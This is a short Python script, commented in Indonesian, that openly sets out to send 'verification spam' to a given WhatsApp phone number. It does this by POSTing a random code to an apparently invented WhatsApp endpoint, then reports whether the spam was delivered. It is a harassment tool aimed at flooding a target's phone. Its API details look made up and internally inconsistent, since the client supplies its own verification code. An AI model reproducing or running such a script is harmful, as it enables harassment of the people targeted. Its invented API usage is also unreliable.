import requests
import random

def send_verification_spam(phone_number):
  """
  Mengirim spam verifikasi ke nomor WhatsApp.

  Args:
    phone_number: Nomor telepon (tanpa awalan +62).

  Returns:
    Response dari server WhatsApp.
  """

  url = "https://api.whatsapp.com/v1/accounts/send_verification_code"
  headers = {
    "Content-Type": "application/json",
  }
  data = {
    "phone_number": phone_number,
    "method": "sms",
  }

  # Generate random verification code
  verification_code = str(random.randint(100000, 999999))

  # Replace the verification code in the data
  data["verification_code"] = verification_code

  response = requests.post(url, headers=headers, json=data)

  return response

# Masukkan nomor telepon di sini
phone_number = "81234567890"

# Kirim spam verifikasi
response = send_verification_spam(phone_number)

# Periksa status response
if response.status_code == 200:
  print("Spam verifikasi berhasil terkirim.")
else:
  print("Terjadi kesalahan:", response.status_code, response.text)
